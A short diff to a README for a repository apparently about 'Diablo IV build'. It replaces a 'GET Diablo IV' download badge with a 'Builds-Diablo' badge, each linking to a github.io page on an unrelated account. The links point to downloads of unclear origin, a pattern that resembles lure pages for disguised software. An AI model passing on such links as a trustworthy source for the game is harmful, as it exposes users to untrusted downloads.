@@ -1,6 +1,6 @@
 # Diablo IV build - Dark Action RPG
 
-[![GET Diablo IV](https://img.shields.io/badge/GET%20%E2%80%94%20Diablo%20IV-0078D6?style=for-the-badge&logoColor=white)](https://noredladyneloms.github.io/.github/Diablo-IV-build)
+[![Diablo Build](https://img.shields.io/badge/Builds-Diablo-6B21A8?style=flat&logo=ghostscript&logoColor=white)](https://build-diablo.github.io/.github/)
 
 ## Journey Through Diablo IV
 
